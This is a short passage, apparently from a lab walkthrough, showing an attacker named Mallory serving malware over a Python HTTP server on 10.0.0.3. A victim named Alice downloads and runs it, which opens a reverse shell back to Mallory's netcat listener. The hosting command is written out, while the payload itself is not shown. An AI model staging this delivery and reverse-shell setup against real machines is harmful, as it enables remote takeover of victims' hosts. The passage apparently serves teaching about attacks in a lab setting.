...
and hosts the malware

```
/shared# python3 -m http.server 80 --bind 10.0.0.3
```

now, Alice downloads and runs the malware
...
once Alice runs the binary, we notice that the terminal where Mallory was listening using netcat connects to Alice's host
